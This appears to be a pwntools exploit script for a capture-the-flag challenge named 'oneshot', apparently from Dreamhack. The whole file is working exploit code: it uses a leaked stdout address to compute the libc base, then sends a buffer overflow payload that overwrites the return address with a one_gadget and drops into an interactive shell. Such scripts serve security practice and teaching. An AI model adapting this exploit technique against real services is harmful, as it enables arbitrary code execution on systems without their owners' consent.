from pwn import *

#p = remote('host3.dreamhack.games', '14687')
p = remote('127.0.0.1', 7182)
#p = process('./oneshot')
e = ELF('./oneshot')
libc = ELF('./libc.so.6')

# 0x45226 0x4527a 0xf03a4 0xf1247
one_gadget = 0x45226
p.recvuntil(b"stdout: ")
stdout = int(p.recvuntil('\n')[:-1], 16)
#print(hex(stdout))
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
print(hex(libc_base))
oneshot = libc_base + one_gadget

payload = b"A"*0x18
payload += b"\x00"*8
payload += b"A"*8
payload += p64(oneshot)

print("one_gadget->", hex(one_gadget))

p.sendlineafter(b"MSG: ", payload)
p.interactive()